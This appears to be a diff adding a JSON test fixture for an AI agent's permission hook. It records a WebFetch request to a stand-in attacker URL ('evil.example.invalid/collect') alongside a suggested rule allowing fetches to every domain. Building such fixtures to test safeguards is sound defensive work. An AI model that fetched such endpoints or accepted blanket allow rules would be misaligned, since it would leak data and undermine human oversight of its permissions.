@@ -1,0 +1,21 @@
+{
+  "cwd": "fixtures/dev/issue-webfetch-star/repo",
+  "hook_event_name": "PermissionRequest",
+  "permission_suggestions": [
+    {
+      "behavior": "allow",
+      "destination": "localSettings",
+      "rules": [
+        {
+          "ruleContent": "domain:*",
+          "toolName": "WebFetch"
+        }
+      ],
+      "type": "addRules"
+    }
+  ],
+  "tool_input": {
+    "url": "https://evil.example.invalid/collect"
+  },
+  "tool_name": "WebFetch"
+}
